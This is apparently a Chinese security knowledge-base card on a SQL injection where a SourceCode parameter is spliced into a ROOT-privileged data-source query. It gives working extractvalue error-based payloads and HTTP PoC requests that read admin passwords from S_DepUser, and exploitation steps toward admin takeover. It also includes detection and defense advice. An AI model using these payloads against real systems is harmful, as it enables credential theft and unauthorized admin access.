---
id: web-generic-sqli-datasource-sourcecode-root-privilege
title: 数据源配置查询注入：SourceCode 直拼 selectOne 由 ROOT 数据源执行，绕过前台普通用户权限读取后台密码
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-datasource-sourcecode-privilege-escalation
aliases:
- S_DataSource SourceCode 注入
- initDataSource 注入
- 数据源查询注入
- 双层数据源权限差异
- 普通用户返回注入
- 配置数据源 ROOT
- S_DepUser 后台密码
tags:
- sqli
- datasource
- privilege-escalation
- mysql
- selectone
- error-based
- admin-takeover
- source-code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V287
  verified_at: '2026-11-08T04:56:08+08:00'
  notes: 已对照原文与29图核对：initDataSource 源码 SELECT * FROM S_DataSource WHERE SourceCode='"+datasource+"' 与 selectOne/registerDataSource（图22）、DataSource 页普通用户 em（图23）、extractvalue 报错回显 ~admin=***123! 读 S_DepUser(UserCode/UserPwd)（图24）、后台 SQL Command SELECT user()=root@localhost（图25）、properties root/allowMultiQueries=true（图21）均一致；JDBC 反序列化不出网（图24原文章0x07）。dedup 除自身外候选均 new。未验证点：图24未直接回显 user()，卡中『先 extractvalue select user() 验证 ROOT』为按原文权限结论推导的示例、未复跑；原文未标产品版本，未设 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

应用用两层数据源：前台业务通过普通账号（示例 `em`）的数据源执行 SQL，而按 `SourceCode` 查 `S_DataSource` 得到配置、再注册新数据源的过程由 ROOT 数据源执行。`SourceCode` 被直接拼进 `SELECT * FROM S_DataSource WHERE SourceCode = '<input>'` 且使用 `selectOne`，虽然不支持堆叠，但可用 `extractvalue` 报错注入以 ROOT 权限读取 `S_DepUser` 的 `UserCode/UserPwd`，从而拿到后台管理员密码登录后台——即一次“普通用户注入、ROOT 数据源执行”的权限升级。

## 原理

- **两层数据源设计**：前台业务查询用普通用户数据源（示例 Data Source 页面显示 User Name=`em`，JDBC URL 指向业务库）；应用启动/切换时，根据前端传入的 `SourceCode` 到 `S_DataSource` 表查询该数据源的配置（URL、驱动、账号、密码），再 `registerDataSource` 动态注册，前台数据都从该数据源获取。
- **注入点**：源码 `initDataSource(ctx, sqlSessionFactory, datasource)` 中执行 `String SQL = "SELECT * FROM S_DataSource WHERE SourceCode = '" + datasource + "'";`，`sqlMapper.selectOne(SQL)` 返回配置。`datasource` 来自请求参数（示例 `DataSource=`），没有参数化，单引号可闭合并注入。
- **权限差异**：这条查询由 `sqlSessionFactory` 对应的配置数据源执行（数据库配置文件中为 `root` 用户），因此尽管前台注入点本身用的是普通用户 `em`，在 `SourceCode` 处的注入语句却以 ROOT 身份执行；攻击者据此可读 `S_DepUser` 等更高权限表。文章通过读取数据库配置与源码审计发现“前台注入普通用户、配置查询却是 ROOT”的差异。
- **为什么不用堆叠**：该处使用 `selectOne`（单条查询），不能像投票注入点那样 `;update ...`；但 MySQL 报错注入可用：`and Extractvalue(1,concat('~',(select ...)))` 会把子查询结果拼进 XPATH 错误信息并回显，`group_concat` 可一次取出多行。
- **利用效果**：示例 `DataSource='+and+Extractvalue(1,concat('~',(select+group_concat(UserCode,'=',UserPwd)+from(S_DepUser))))#` 在错误信息中得到 `admin=<密码>`，用该口令登录 `/admin/login.jsp`（该路径来自 web.xml 的 `excludeUrls`）进入后台。
- **为什么可行**：数据源切换功能把“配置查询”和“业务查询”分离，但两者共用同一套字符串拼接代码，且配置查询使用了高权限连接；攻击者只需控制 `SourceCode` 即可把注入语句送到 ROOT 连接。

## 触发条件

- 应用存在按 `SourceCode`/`DataSource` 动态切换数据源的功能，且查询配置的 SQL 由字符串拼接生成（示例 `SELECT * FROM S_DataSource WHERE SourceCode = '<input>'`）。
- 配置查询使用高权限（ROOT）数据源，而前台业务注入点使用普通用户数据源；或至少配置查询连接权限高于业务连接。
- 注入点可触发错误回显（MySQL `extractvalue`/`updatexml`），或可通过盲注/时间注入读取数据。
- 攻击者能访问到 `SourceCode` 参数（前台接口/后台登录前入口），并能读取源码或配置以确认数据库分层（示例通过任意文件读取获得 properties 与 `initDataSource` 源码）。

## 利用步骤

1. 信息收集：通过任意文件读取（示例 s_filedata/FileGUID 卡）拿到数据库 properties（`root` 配置、`allowMultiQueries=true`）与部分源码，确认两层数据源和 `initDataSource` 的拼接 SQL。
2. 找到前台接收 `SourceCode`/`DataSource` 的接口，确认参数进入 `SELECT * FROM S_DataSource WHERE SourceCode = '<input>'`。
3. 验证执行账号：`DataSource='+and+Extractvalue(1,concat('~',(select+user())))#`，从 XPATH 报错看是否为 `root@localhost`（或其他高权限账号）。
4. 读取后台用户表：`DataSource='+and+Extractvalue(1,concat('~',(select+group_concat(UserCode,'=',UserPwd)+from(S_DepUser))))#`；若长度受限，用 `substr` 分段。
5. 用得到的 `UserCode/UserPwd` 登录后台入口（示例 web.xml `excludeUrls` 中的 `/admin/login.jsp`），确认权限。
6. 在后台数据源配置/JDBC 功能继续测试（示例尝试 JDBC 反序列化，目标不出网未成功）；或寻找后台 ROOT SQL 执行功能继续 RCE。

## PoC

验证账号与读取后台密码（示例请求，`+` 表示 URL 编码空格）：

```http
POST /<数据源查询接口> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

DataSource='+and+Extractvalue(1,concat('~',(select+user())))#
```

返回的 XPATH 错误包含 `~root@localhost`，说明该查询由 ROOT 数据源执行。

```http
POST /<数据源查询接口> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

DataSource='+and+Extractvalue(1,concat('~',(select+group_concat(UserCode,'=',UserPwd)+from(S_DepUser))))#
```

错误信息形如 `~admin=<后台密码>`，用该账号登录后台。示例中 `S_DepUser` 为后台用户表，`DataSource` 参数进入的 SQL 为：

```sql
SELECT * FROM S_DataSource WHERE SourceCode = '' and Extractvalue(1, concat('~', (select group_concat(UserCode,'=',UserPwd) from(S_DepUser))))#
```

## 变体与关联

- [[web-generic-sqli-stacked-file-table-arbitrary-file-read]]：同一测试链的前置信息收集卡，通过堆叠注入改文件表任意读，读到 properties/web.xml/源码后才定位到本卡的数据源分层。
- [[web-generic-sqli-second-order-injection]]：通用二次注入；本卡不是“存储后回读拼接”，而是“同一参数被不同权限的数据源执行”，属于权限路由错误。
- [[web-java-component-lowcode-datasource-validate-h2-javascript-trigger-rce]]：低代码平台数据源配置校验的 JDBC URL 注入；本卡是 SourceCode 查询 SQL 注入，后续也可在数据源配置处尝试 JDBC 链。
- [[web-generic-sqli-weaver-mobilemode-runsql-datasource-bypass]]：后台数据源绕过执行任意 SQL；与本卡“配置查询注入”可组合（先读后台密码，再用后台数据源执行）。
- [[web-generic-sqli-mysql-outfile-general-log-webshell]]：获得后台 ROOT SQL 执行后的写 WebShell 方法（示例最终以 general_log 落地 JSP）。
- 变体：若 `selectOne` 有多列/单行限制，可用 `group_concat`、`limit`、`substr` 或盲注；若前端错误被隐藏，改布尔/时间盲注。
- 边界：若配置查询已参数化、配置数据源与业务数据源同权限、或错误信息不回显且无法盲注，本卡不成立；JDBC 反序列化需要目标出网或本地 gadget，示例因不出网失败。

## 检测与防御

- **检测**：`SourceCode`/`DataSource` 参数出现单引号、`extractvalue`、`updatexml`、`select`、`group_concat` 等特征；响应错误含 `XPATH syntax error`；SQL 日志中配置数据源账号（如 root）执行了来自请求的异常查询；普通业务请求突然查询 `S_DataSource`、`S_DepUser` 等配置/后台表。
- **防御**：`SourceCode` 查询全部参数化；数据源切换只允许白名单中的 `SourceCode`；配置查询使用只读且最小权限的账号，避免与业务/后台 ROOT 账号共用；隐藏数据库错误；不同数据源使用独立凭据并限制跨库访问；审计 `initDataSource` 一类“用户输入 → SQL 拼接”的代码。
- **响应**：确认是否有异常数据源查询与 `S_DepUser` 读取；重置后台与数据库口令；检查是否已登录后台并触发后续 SQL/文件写入。
